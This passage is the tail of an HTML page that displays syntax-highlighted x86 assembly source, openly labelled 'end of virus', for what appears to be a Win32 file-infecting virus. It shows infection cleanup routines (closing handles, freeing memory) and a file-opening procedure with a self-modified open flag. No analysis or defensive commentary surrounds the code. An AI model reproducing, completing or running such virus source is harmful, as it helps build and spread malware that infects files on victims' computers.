</span><span class="sc5">infect_end_handle</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">         </span><span class="sc1">;close its file handle</span><span class="sc0">
</span><span class="sc5">infect_end_dealloc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_DECOMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_size</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VirtualFree</span><span class="sc0">         </span><span class="sc1">;free allocated memory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_RELEASE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VirtualFree</span><span class="sc0">         </span><span class="sc1">;release reserved part of mem</span><span class="sc0">
</span><span class="sc5">infect_end</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; [esp+4] - file_name   </span><span class="sc0">
</span><span class="sc5">Create_File</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;proc for opening file</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6ah</span><span class="sc0">
</span><span class="sc5">flagz</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">           </span><span class="sc1">;variable file open flag</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileA</span><span class="sc0">         </span><span class="sc1">;open file</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;handle to EBX</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;is EBX -1?</span><span class="sc0">
    </span><span class="sc6">lahf</span><span class="sc0">                    </span><span class="sc1">;store flags</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;correct EBX</span><span class="sc0">
    </span><span class="sc6">sahf</span><span class="sc0">                    </span><span class="sc1">;restore flags</span><span class="sc0">
    </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">;quit from proc</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">                   </span><span class="sc1">;end of virus</span><span class="sc0">
</span></div></body>
</html>
